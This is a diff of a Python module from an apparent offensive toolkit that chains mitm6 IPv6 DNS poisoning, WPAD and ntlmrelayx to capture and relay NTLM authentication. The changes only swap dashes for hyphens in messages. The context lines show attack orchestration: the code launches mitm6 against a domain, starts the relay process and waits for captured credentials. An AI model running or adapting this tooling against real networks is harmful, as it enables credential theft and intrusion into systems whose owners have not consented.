@@ -1,4 +1,4 @@
-"""mitm6 + relay combo — IPv6 DNS poisoning → WPAD → NTLM relay."""
+"""mitm6 + relay combo  -  IPv6 DNS poisoning → WPAD → NTLM relay."""
 import subprocess
 import sys
 import shutil
@@ -24,7 +24,7 @@ def run(args: Any) -> int:
         return 1
 
     if not shutil.which("mitm6"):
-        print("[!] mitm6 not found — pip install mitm6", file=sys.stderr)
+        print("[!] mitm6 not found  -  pip install mitm6", file=sys.stderr)
         return 1
 
     mitm6_cmd = ["mitm6", "-d", domain]
@@ -57,7 +57,7 @@ def run(args: Any) -> int:
                                        stderr=subprocess.STDOUT, text=True)
         print(f"[+] ntlmrelayx running (PID {relay_proc.pid})")
 
-        print("[*] Both running — waiting for captured auth...")
+        print("[*] Both running  -  waiting for captured auth...")
         for line in relay_proc.stdout:
             print(f"  [relay] {line.rstrip()}")
             if "authenticat" in line.lower():
